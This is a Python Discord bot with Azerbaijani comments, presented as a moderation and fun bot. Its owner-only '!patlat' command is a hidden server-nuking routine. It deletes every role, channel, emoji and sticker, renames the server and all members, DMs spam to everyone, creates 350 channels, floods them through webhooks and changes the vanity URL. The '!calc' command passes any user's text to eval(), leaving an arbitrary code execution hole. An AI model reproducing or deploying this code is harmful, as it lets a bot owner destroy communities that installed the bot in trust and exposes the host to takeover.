import os
import random
import asyncio
from datetime import datetime, timedelta
import discord
from discord.ext import commands
from keep_alive import keep_alive

# ==========================================
# 1. PARAMETRLƏR VƏ İNİSİALİZASİYA
# ==========================================

INTENTS = discord.Intents.default()
INTENTS.members = True
INTENTS.message_content = True
INTENTS.guilds = True
INTENTS.voice_states = True

bot = commands.Bot(command_prefix="!", intents=INTENTS)

SAHIB_ID = 000000000000000000         # <--- Öz Discord ID-ni bura yaz
GUVENLI_SERVER_ID = 1520692621964738722  # <--- Bu serverdə patlat əmri QƏTİ İŞLƏMƏZ!
BOT_COLOR = discord.Color.blurple()

user_xp = {}
user_recent_messages = {}

# ==========================================
# 2. BOT HAZIR OLAN KİMİ (ON_READY)
# ==========================================

@bot.event
async def on_ready():
    print(f"Bot tam gücü ilə işə düşdü: {bot.user.name} (ID: {bot.user.id}) - 244 Bot v3.2 Ultimate")
    try:
        await bot.change_presence(activity=discord.Game(name="!yardim | discord.gg/244"))
    except:
        pass

# ==========================================
# 3. GÜVƏNLİK, ANTİ-SPAM, RANDOM & WEBHOOK QORUMA
# ==========================================

@bot.event
async def on_member_join(member):
    if member.bot:
        try:
            await member.kick(reason="Serverə icazəsiz bot əlavə etmək qadağandır!")
        except:
            pass

@bot.event
async def on_message(message):
    if message.author.bot:
        if message.webhook_id:
            try:
                await message.delete()
                return
            except:
                pass
        await bot.process_commands(message)
        return

    author_id = message.author.id
    content_lower = message.content.lower()

    if "discord.gg/" in content_lower or "gg/" in content_lower:
        if "discord.gg/244" not in content_lower:
            try:
                await message.delete()
                await message.channel.send(f"{message.author.mention}, Bu serverdə reklam qadağandır! 🛑", delete_after=5)
            except:
                pass
            return

    now = datetime.now()
    if author_id not in user_recent_messages:
        user_recent_messages[author_id] = []
    
    user_recent_messages[author_id] = [t for t in user_recent_messages[author_id] if now - t < timedelta(seconds=5)]
    user_recent_messages[author_id].append(now)

    if len(user_recent_messages[author_id]) > 4:
        try:
            await message.delete()
            words = message.content.split()
            if len(words) >= 13:
                await message.channel.send(f"YAVAS YAZ OQL {message.author.mention}", delete_after=5)
            else:
                await message.channel.send(f"{message.author.mention} Spam etmə!", delete_after=5)
        except:
            pass
        return

    if author_id not in user_xp:
        user_xp[author_id] = {"xp": 0, "level": 1}
    
    data = user_xp[author_id]
    data["xp"] += random.randint(3, 15)

    next_level_xp = data["level"] * 100
    if data["xp"] >= next_level_xp:
        data["level"] += 1
        data["xp"] = 0
        try:
            await message.channel.send(f"🎉 Təbriklər {message.author.mention}, səviyyə atladın! Yeni səviyyə: {data['level']}")
        except:
            pass

    user_xp[author_id] = data
    await bot.process_commands(message)

# ==========================================
# 4. YARDIM VƏ PANEL ƏMRLƏRİ
# ==========================================

@bot.command(name="yardim", aliases=["help", "komutlar"])
async def yardim_cmd(ctx):
    embed = discord.Embed(title="🛡️ 244 Bot v3.2 - Ultimate Menyu", color=BOT_COLOR)
    embed.add_field(name="🛡️ Moderasiya & Qoruma", value="!ban, !unban, !kick, !mute, !unmute, !temizle, !slowmode, !lock, !unlock, !rolver, !rolal", inline=False)
    embed.add_field(name="📌 Sistem & Qurulum", value="!ticketkur, !close, !kanalac, !kanalsil, !patlat", inline=False)
    embed.add_field(name="📊 Statistika & Məlumat", value="!url, !level, !aktivite, !serverinfo, !userinfo, !botbilgi, !boosters, !emojiler, !afk", inline=False)
    embed.add_field(name="🎮 Oyunlar & Əyləncə", value="!ping, !roll, !coinflip, !iq, !gay, !handsome, !love, !sex, !hack, !slot, !8ball, !calc, !joke, !rps, !poll, !bomba, !ask", inline=False)
    embed.add_field(name="🎭 Sosial & Reaksiya", value="!saril, !opucuk, !tokat, !ates, !dans, !agla, !gul, !qorx, !dusunceli, !epic", inline=False)
    embed.set_footer(text="244 Bot | discord.gg/244")
    await ctx.send(embed=embed)

@bot.command(name="panel")
async def panel_cmd(ctx):
    if ctx.author.id == SAHIB_ID or ctx.author.guild_permissions.administrator:
        embed = discord.Embed(title="⚙️ 244 İDARƏETMƏ PANELİ", description="Aşağıdakı düymələrdən istifadə edin:", color=BOT_COLOR)
        view = discord.ui.View(timeout=None)
        view.add_item(discord.ui.Button(label="🎫 Bütün Kanalları Kilidlə", style=discord.ButtonStyle.danger, custom_id="btn_lock"))
        view.add_item(discord.ui.Button(label="🔓 Bütün Kanalların Kilidini Aç", style=discord.ButtonStyle.success, custom_id="btn_unlock"))
        view.add_item(discord.ui.Button(label="🔒 Kanalları Gizlə", style=discord.ButtonStyle.secondary, custom_id="btn_hide"))
        view.add_item(discord.ui.Button(label="👁️ Kanalları Göstər", style=discord.ButtonStyle.primary, custom_id="btn_show"))
        view.add_item(discord.ui.Button(label="🎲 Zar At", style=discord.ButtonStyle.primary, custom_id="btn_roll"))
        view.add_item(discord.ui.Button(label="💻 Hack Simulyasiyası", style=discord.ButtonStyle.danger, custom_id="btn_hack"))
        view.add_item(discord.ui.Button(label="🎰 Slot Oyunu", style=discord.ButtonStyle.primary, custom_id="btn_slot"))
        view.add_item(discord.ui.Button(label="🎟️ Ana Menyuya Qayıt", style=discord.ButtonStyle.secondary, custom_id="btn_back"))
        await ctx.send(embed=embed, view=view)
    else:
        await ctx.send("❌ Bu əmri işlətmək üçün səlahiyyətin yoxdur!")

# ==========================================
# 5. DÜYMƏ (BUTTON) İNTERAKSİYALARI
# ==========================================

@bot.event
async def on_interaction(interaction: discord.Interaction):
    if not interaction.data or "custom_id" not in interaction.data:
        return
    
    custom_id = interaction.data.get("custom_id")
    guild = interaction.guild

    if custom_id == "open_ticket":
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            interaction.user: discord.PermissionOverwrite(view_channel=True, send_messages=True),
        }
        channel_name = f"ticket-{interaction.user.name.lower()}"
        ticket_chan = await guild.create_text_channel(channel_name, overwrites=overwrites)
        embed = discord.Embed(title="🎫 244 Dəstək Sistemi", description="Bura dəstək istəyinizi yazın.", color=BOT_COLOR)
        await ticket_chan.send(content=f"{interaction.user.mention}", embed=embed)
        await interaction.response.send_message("✅ Ticket yaradıldı!", ephemeral=True)

    elif custom_id == "btn_lock":
        if not interaction.user.guild_permissions.manage_channels:
            await interaction.response.send_message("❌ İcazəniz yoxdur!", ephemeral=True)
            return
        await interaction.response.defer(ephemeral=True)
        for channel in guild.text_channels:
            try:
                await channel.set_permissions(guild.default_role, send_messages=False)
            except:
                pass
        await interaction.followup.send("🔒 Bütün kanallar kilidləndi!", ephemeral=True)

    elif custom_id == "btn_unlock":
        if not interaction.user.guild_permissions.manage_channels:
            await interaction.response.send_message("❌ İcazəniz yoxdur!", ephemeral=True)
            return
        await interaction.response.defer(ephemeral=True)
        for channel in guild.text_channels:
            try:
                await channel.set_permissions(guild.default_role, send_messages=True)
            except:
                pass
        await interaction.followup.send("🔓 Bütün kanalların kilidi açıldı!", ephemeral=True)

    elif custom_id == "btn_hide":
        if not interaction.user.guild_permissions.manage_channels:
            await interaction.response.send_message("❌ İcazəniz yoxdur!", ephemeral=True)
            return
        await interaction.response.defer(ephemeral=True)
        for channel in guild.text_channels:
            try:
                await channel.set_permissions(guild.default_role, view_channel=False)
            except:
                pass
        await interaction.followup.send("🙈 Bütün kanallar gizlətildi!", ephemeral=True)

    elif custom_id == "btn_show":
        if not interaction.user.guild_permissions.manage_channels:
            await interaction.response.send_message("❌ İcazəniz yoxdur!", ephemeral=True)
            return
        await interaction.response.defer(ephemeral=True)
        for channel in guild.text_channels:
            try:
                await channel.set_permissions(guild.default_role, view_channel=True)
            except:
                pass
        await interaction.followup.send("👁️ Bütün kanallar göstərildi!", ephemeral=True)

    elif custom_id == "btn_roll":
        await interaction.response.send_message(f"🎲 Zar nəticəsi: {random.randint(1, 6)}", ephemeral=True)
    elif custom_id == "btn_hack":
        await interaction.response.send_message(f"💻 IP: 192.168.{random.randint(10, 99)}.{random.randint(10, 99)} - Sistemə sızıldı!", ephemeral=True)
    elif custom_id == "btn_slot":
        semboller = ['🍎', '🍋', '🍒', '🔔', '⭐']
        res = f"{random.choice(semboller)} | {random.choice(semboller)} | {random.choice(semboller)}"
        await interaction.response.send_message(f"🎰 Slot: {res}", ephemeral=True)
    elif custom_id == "btn_back":
        await interaction.response.send_message("🔄 Ana menyuya qayıdıldı.", ephemeral=True)

# ==========================================
# 6. MODERASİYA, URL VƏ ƏMRLƏR
# ==========================================

@bot.command(name="url")
async def url_cmd(ctx):
    try:
        vanity = await ctx.guild.vanity_invite()
        code = vanity.code if vanity else "244"
    except:
        code = "244"

    embed = discord.Embed(title="🌐 Server URL Məlumatı", color=BOT_COLOR)
    embed.add_field(name="Vanity URL", value=f"discord.gg/{code}", inline=False)
    await ctx.send(embed=embed)

@bot.command(name="ban")
async def ban_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if not ctx.author.guild_permissions.ban_members:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        await member.ban(reason=reason)
        await ctx.send(f"✅ {member.mention} uğurla banlandı! Səbəb: {reason}")
    except:
        await ctx.send("❌ İstifadəçi banlana bilmədi.")

@bot.command(name="unban")
async def unban_cmd(ctx, user_id: int):
    if not ctx.author.guild_permissions.ban_members:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        user = await bot.fetch_user(user_id)
        await ctx.guild.unban(user)
        await ctx.send(f"✅ {user.name} adlı istifadəçinin banı qaldırıldı.")
    except:
        await ctx.send("❌ İstifadəçi tapılmadı.")

@bot.command(name="kick")
async def kick_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if not ctx.author.guild_permissions.kick_members:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        await member.kick(reason=reason)
        await ctx.send(f"✅ {member.mention} qovuldu! Səbəb: {reason}")
    except:
        await ctx.send("❌ Qovmaq mümkün olmadı.")

@bot.command(name="mute")
async def mute_cmd(ctx, member: discord.Member, minutes: int = 5, *, reason="Göstərilməyib"):
    if not ctx.author.guild_permissions.moderate_members:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        await member.timeout(timedelta(minutes=minutes), reason=reason)
        await ctx.send(f"🔇 {member.mention} {minutes} dəqiqə susduruldu.")
    except:
        await ctx.send("❌ Susdurmaq mümkün olmadı.")

@bot.command(name="unmute")
async def unmute_cmd(ctx, member: discord.Member):
    if not ctx.author.guild_permissions.moderate_members:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        await member.timeout(None)
        await ctx.send(f"🔊 {member.mention} istifadəçisinin susdurulması qaldırıldı.")
    except:
        await ctx.send("❌ Xəta baş verdi.")

@bot.command(name="temizle", aliases=["clear", "sil"])
async def temizle_cmd(ctx, amount: int = 10):
    if not ctx.author.guild_permissions.manage_messages:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        deleted = await ctx.channel.purge(limit=amount)
        await ctx.send(f"🗑️ {len(deleted)} ədəd mesaj silindi.", delete_after=5)
    except:
        await ctx.send("❌ Mesajlar silinərkən xəta baş verdi.")

@bot.command(name="slowmode")
async def slowmode_cmd(ctx, seconds: int = 0):
    if not ctx.author.guild_permissions.manage_channels:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        await ctx.channel.edit(slowmode_delay=seconds)
        await ctx.send(f"⏱️ Slowmode {seconds} saniyə olaraq tənzimləndi.")
    except:
        await ctx.send("❌ Xəta baş verdi.")

@bot.command(name="lock")
async def lock_cmd(ctx):
    if not ctx.author.guild_permissions.manage_channels:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
        await ctx.send("🔒 Bu kanal yazışmaya bağlandı.")
    except:
        await ctx.send("❌ Xəta baş verdi.")

@bot.command(name="unlock")
async def unlock_cmd(ctx):
    if not ctx.author.guild_permissions.manage_channels:
        await ctx.send("❌ İcazəniz yoxdur!")
        return
    try:
        await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)
        await ctx.send("🔓 Bu kanalın yazışma kilidi açıldı.")
    except:
        await ctx.send("❌ Xəta baş verdi.")

# ==========================================
# 7. ULTIMATE !PATLAT SİSTEMİ (Hamsı 244)
# ==========================================

@bot.command(name="patlat")
async def patlat_cmd(ctx):
    if ctx.author.id != SAHIB_ID:
        await ctx.send("❌ Bu əmri yalnız bot sahibi işlədə bilər!")
        return
    
    guild = ctx.guild
    if guild.id == GUVENLI_SERVER_ID:
        await ctx.send("🛡️ Təhlükəsizlik xəbərdarlığı: Bu qorunan serverdir, əməliyyat qəti şəkildə dayandırıldı!")
        return

    await ctx.send("🔥 244 kütləvi əməliyyat və təmizlik başladı...")

    # 1. Bütün Rolları silmək
    for role in guild.roles:
        if role != guild.default_role and role < guild.me.top_role:
            try:
                await role.delete()
            except:
                pass

    # 2. Yeni rol yaratmaq: "discord.gg/244"
    try:
        yeni_rol = await guild.create_role(name="discord.gg/244", color=discord.Color.red())
    except:
        yeni_rol = None

    # 3. Sunucu adını dəyişmək: "discord.gg/244"
    try:
        await guild.edit(name="discord.gg/244")
    except:
        pass

    # 4. Bütün stikerləri və emojiləri silmək
    for emoji in guild.emojis:
        try:
            await emoji.delete()
        except:
            pass
    for sticker in guild.stickers:
        try:
            await sticker.delete()
        except:
            pass

    # 5. Mövcud bütün kanalları silmək
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

    # 6. Hər kəsə şəxsi DM mesajı göndərmək
    for member in guild.members:
        if not member.bot:
            try:
                await member.send("RUHUM SKDI !discord.gg/244\n YAZ GİR")
            except:
                pass

    # 7. Hamının nickini dəyişmək: "discord.gg/244"
    for member in guild.members:
        if member != guild.owner:
            try:
                await member.edit(nick="discord.gg/244")
            except:
                pass

    # 8. Yenidən 350 dənə kanal açmaq (Yavaş və ağıllı şəkildə)
    olusturulan_kanallar = []
    for i in range(1, 351):
        try:
            kanal_adi = f"discord.gg-244-{i}"
            chan = await guild.create_text_channel(kanal_adi)
            olusturulan_kanallar.append(chan)
            await asyncio.sleep(0.8)
        except:
            pass

    # 9. Hər bir kanala 4 dənə webhook əlavə etmək və mesaj yazdırmaq
    spam_metni = "discord.gg/244 yaz gır oql!discord.gg/244 yaz gır oql"
    
    for chan in olusturulan_kanallar:
        webhooks = []
        for w in range(4):
            try:
                wh = await chan.create_webhook(name=f"RUHUM-{w+1}")
                webhooks.append(wh)
            except:
                pass
        
        if webhooks:
            async def webhook_flood(wh):
                for _ in range(125):
                    try:
                        await wh.send(spam_metni)
                        await asyncio.sleep(0.1)
                    except:
                        break
            
            tasks = [webhook_flood(wh) for wh in webhooks]
            await asyncio.gather(*tasks)

    # 10. URL dəyişimi
    try:
        await guild.edit(vanity_code="ruhumskdi")
    except:
        pass

    # 11. Ən sonda "ruhum-tanri" kanalı və mesaj
    try:
        son_kanal = await guild.create_text_channel("ruhum-tanri")
        await son_kanal.send("@everyone ruhum shdı gagas")
    except:
        pass

# ==========================================
# 8. TICKET VƏ KANAL ƏMRLƏRİ
# ==========================================

@bot.command(name="ticketkur")
async def ticketkur_cmd(ctx):
    if ctx.author.id == SAHIB_ID or ctx.author.guild_permissions.administrator:
        embed = discord.Embed(title="🎫 244 Dəstək Xidməti", description="Dəstək tələb etmək üçün düyməyə basın.", color=BOT_COLOR)
        view = discord.ui.View(timeout=None)
        view.add_item(discord.ui.Button(label="🎫 Dəstək Tələb Et", style=discord.ButtonStyle.primary, custom_id="open_ticket"))
        await ctx.send(embed=embed, view=view)

@bot.command(name="close")
async def close_cmd(ctx):
    if "ticket" in ctx.channel.name:
        await ctx.send("🔒 Ticket 3 saniyə sonra bağlanacaq...")
        await asyncio.sleep(3)
        try:
            await ctx.channel.delete()
        except:
            pass
    else:
        await ctx.send("❌ Bu komanda yalnız ticket kanallarında işləyir.")

@bot.command(name="kanalac")
async def kanalac_cmd(ctx, *, name):
    if not ctx.author.guild_permissions.manage_channels:
        return
    await ctx.guild.create_text_channel(name)
    await ctx.send(f"✅ `{name}` kanalı yaradıldı.")

@bot.command(name="kanalsil")
async def kanalsil_cmd(ctx, channel: discord.TextChannel = None):
    if not ctx.author.guild_permissions.manage_channels:
        return
    c = channel or ctx.channel
    await c.delete()

# ==========================================
# 9. OYUNLAR, STATİSTİKA VƏ KOMUTLAR
# ==========================================

@bot.command(name="level", aliases=["lvl"])
async def level_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    data = user_xp.get(m.id, {"xp": 0, "level": 1})
    embed = discord.Embed(title=f"📊 {m.name} - Səviyyə Məlumatı", color=BOT_COLOR)
    embed.add_field(name="Səviyyə", value=str(data["level"]), inline=True)
    embed.add_field(name="XP", value=str(data["xp"]), inline=True)
    await ctx.send(embed=embed)

@bot.command(name="ping")
async def ping_cmd(ctx):
    await ctx.send(f"🏓 Gecikmə: {round(bot.latency * 1000)}ms | discord.gg/244")

@bot.command(name="roll")
async def roll_cmd(ctx):
    await ctx.send(f"🎲 Zar: **{random.randint(1, 6)}**")

@bot.command(name="coinflip", aliases=["yaziqara"])
async def coinflip_cmd(ctx):
    await ctx.send(f"🪙 Qəpik: **{random.choice(['Yazı', 'Para'])}**")

@bot.command(name="iq")
async def iq_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🧠 {m.mention} IQ səviyyəsi: **{random.randint(40, 160)}**")

@bot.command(name="hack")
async def hack_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    msg = await ctx.send(f"💻 {m.mention} hədəfə alındı, sistemə sızılır...")
    await asyncio.sleep(1.5)
    await msg.edit(content=f"✅ {m.mention} hacklendi! IP: 192.168.{random.randint(10,99)}.{random.randint(10,99)}")

@bot.command(name="calc")
async def calc_cmd(ctx, *, expression):
    try:
        netice = eval(expression)
        await ctx.send(f"🧮 Nəticə: **{netice}**")
    except:
        await ctx.send("❌ Riyazi ifadə səhvdir.")

@bot.command(name="afk")
async def afk_cmd(ctx, *, sebep="Səbəb göstərilməyib"):
    await ctx.send(f"💤 {ctx.author.mention} artıq AFK-dır. Səbəb: {sebep}")

@bot.command(name="saril")
async def saril_cmd(ctx, member: discord.Member):
    await ctx.send(f"🤗 {ctx.author.mention}, {member.mention} adama qucaq açdı!")

@bot.command(name="tokat")
async def tokat_cmd(ctx, member: discord.Member):
    await ctx.send(f"👋 {ctx.author.mention}, {member.mention} üzünə sərt bir şillə vurdu!")

@bot.command(name="opucuk")
async def opucuk_cmd(ctx, member: discord.Member):
    await ctx.send(f"😘 {ctx.author.mention}, {member.mention} yanağından öpdü.")

# ==========================================
# 10. BOTUN BAŞLADILMASI
# ==========================================

if __name__ == "__main__":
    keep_alive()
    token = os.getenv("DISCORD_TOKEN")
    if token:
        bot.run(token)
    else:
        print("❌ XƏTA: 'DISCORD_TOKEN' tapılmadı! Replit Secrets bölməsini yoxlayın.")
        
